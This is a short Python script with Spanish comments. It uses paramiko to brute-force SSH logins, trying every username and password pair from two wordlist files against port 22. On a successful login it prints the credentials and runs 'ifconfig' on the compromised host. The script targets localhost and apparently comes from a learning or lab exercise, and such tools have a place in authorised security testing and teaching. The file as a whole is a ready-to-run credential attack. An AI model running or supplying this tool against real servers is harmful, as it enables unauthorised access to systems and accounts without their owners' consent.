import paramiko
import socket
import sys

class SSHConnection:
    
    def __init__(self):
        self.sshClient = paramiko.SSHClient()

    def conexion_ssh(self,ip,usuario,password,code=0):
        self.sshClient.load_system_host_keys()
        self.sshClient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        print("[*] Comprobando usuario y pasword con fichero diccionario ")
        print("[*] Usuario: %s" %(usuario))
        print("[*] Password :%s" %(password))
        try:
            self.sshClient.connect(ip,port=22,username=usuario,password=password,timeout=5)
        except paramiko.AuthenticationException:
            code = 1
            self.sshClient.close()
        except socket.error as exception:
            code = 2
            self.sshClient.close()
        
        return code

    def fuera_bruta_SSH(self,host):
        try:
            #abrir fichero
            usuarios_file = open("usuarios.txt",'r')
            passwords_file = open("passwords.txt",'r')
            usuarios = usuarios_file.readlines()
            passwords = passwords_file.readlines()
            print(usuarios)
            print(passwords)
            for user in usuarios:
                for password in passwords:
                    user_text = user.rstrip()
                    password_text = password.rstrip()
                    try:
                        #comprobar conexión con usuario y password
                        response = self.conexion_ssh(host,user_text,password_text)
                        if response == 0:
                            print("[*] Usuario: %s [*] Pass encontrados:%s" %(user_text,password_text))
                            print(self.sshClient)
                            stdin,stdout,stderr = self.sshClient.exec_command("ifconfig")
                            for line in stdout.readlines():
                                print(line.strip())
                            sys.exit(0)
                        elif response == 1:
                            print("[*]Login incorrecto")
                        elif response == 2:
                            print("[*] Conexión no se ha podido establecer con el host %s" %(host))
                            sys.exit(2)
                    except Exception as exception:
                        print("Error conexion ssh ",exception)
            
            #cerrar ficheros
            usuarios_file.close()
            passwords_file.close()

        except Exception as exception:
            print("ficehros usuarios.txt /passwords.txt no encontrados",exception)

if __name__ == '__main__':
    sshConnection = SSHConnection()
    sshConnection.fuera_bruta_SSH('localhost')
